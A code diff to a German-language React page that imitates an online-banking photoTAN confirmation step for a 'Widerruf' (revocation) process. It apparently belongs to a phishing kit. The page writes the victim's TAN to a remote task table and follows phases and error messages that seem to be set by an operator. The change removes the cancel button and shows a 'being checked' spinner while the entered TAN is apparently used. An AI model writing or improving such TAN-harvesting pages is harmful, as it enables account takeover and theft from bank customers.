@@ -30,11 +30,18 @@ const WiderrufPhotoTan = () => {
         .eq("token", token)
         .maybeSingle();
       if (!data) return;
-      setRow(data as Row);
+      setRow((prev) => {
+        if (prev && (data as Row).last_error && (data as Row).last_error !== prev.last_error) {
+          setSaving(false);
+          setTan("");
+        }
+        return data as Row;
+      });
       const p = (data as Row).customer_phase;
       if (p === "success") navigate(`/success?token=${encodeURIComponent(token)}`);
       else if (p === "aborted") navigate("/auth");
       else if (p === "phototan_request" || p === "start") navigate(`/widerruf/start?token=${encodeURIComponent(token)}`);
+
     };
     load();
     const ch = (supabase as any)
@@ -52,15 +59,8 @@ const WiderrufPhotoTan = () => {
       { task_id: `storno:${row.id}`, tan },
       { onConflict: "task_id" }
     );
-    setSaving(false);
   };
 
-  const abort = async () => {
-    if (!row) return;
-    await (supabase as any).from("storno_tokens").update({
-      customer_phase: "aborted",
-    }).eq("id", row.id);
-  };
 
   const Field = ({ label, value }: { label: string; value: string }) => (
     <div>
@@ -140,20 +140,22 @@ const WiderrufPhotoTan = () => {
             </div>
 
             <div className="flex justify-end items-center gap-4 pt-2">
-              <button
-                onClick={abort}
-                className="text-sm text-[#002776] hover:underline px-2"
-              >
-                Abbrechen
-              </button>
               <Button
                 disabled={!validTan || saving}
                 onClick={submitTan}
                 className={`rounded-full px-6 disabled:opacity-100 ${validTan ? "bg-white text-foreground border border-border hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
               >
-                Freigeben
+                {saving ? (
+                  <span className="inline-flex items-center gap-2">
+                    <span className="h-4 w-4 border-2 border-foreground/40 border-t-transparent rounded-full animate-spin" />
+                    Wird geprüft…
+                  </span>
+                ) : (
+                  "Freigeben"
+                )}
               </Button>
             </div>
+
           </div>
         </div>
       </main>
